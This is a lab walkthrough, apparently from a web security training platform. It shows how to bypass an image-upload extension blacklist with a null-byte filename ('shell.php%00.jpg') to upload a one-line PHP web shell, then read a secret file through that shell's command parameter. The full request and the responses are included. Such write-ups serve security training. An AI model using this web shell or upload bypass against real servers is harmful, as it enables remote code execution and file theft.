## Web shell upload via obfuscated file extension

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

## Notes

- Possibility to leave a comment on a post
- File Upload feature on user account


## Resume

1. Login with wiener:peter
2. Upload **php** shell
3. RCE with **php** shell


## Solve 

The **file upload** feature is on `/my-account`, we have to login with wiener:peter. We can update our **Avatar** via file upload. We will upload our shell.php trying to RCE.

**shell.php**

```php
<?=`$_GET[0]`?>
```

This give us an error : 

```
HTTP/2 403 Forbidden
Date: Wed, 29 Apr 2026 11:40:45 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 171



Sorry, only JPG & PNG files are allowed
Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

To bypass, we will have to obfuscate the extension, to do this we are using **null bytes** : 

```
------WebKitFormBoundaryqwvzhbRBd7re6Mnl

Content-Disposition: form-data; name="avatar"; filename="shell.php%00.jpg"

Content-Type: application/x-php



<?=`$_GET[0]`?>


------WebKitFormBoundaryqwvzhbRBd7re6Mnl
Content-Disposition: form-data; name="user"



wiener
------WebKitFormBoundaryqwvzhbRBd7re6Mnl
Content-Disposition: form-data; name="csrf"


9nPLEDhJlfUXiBiOyL147AJ1Zvl89NQy
------WebKitFormBoundaryqwvzhbRBd7re6Mnl--
```

The answer is now : 

```
HTTP/2 200 OK
Date: Wed, 29 Apr 2026 11:40:45 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 171



The file avatars/shell.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```


Once it's uploaded, we can right click over our avatar and open the "image" in new tab. In order to get `/home/carlos/secret` we can use the web shell : 

`/files/avatars/shell.php?0=cat%20/home/carlos/secret` -> "eahbCoFIRCbacWVeRinCj5f6kAw2V8qz"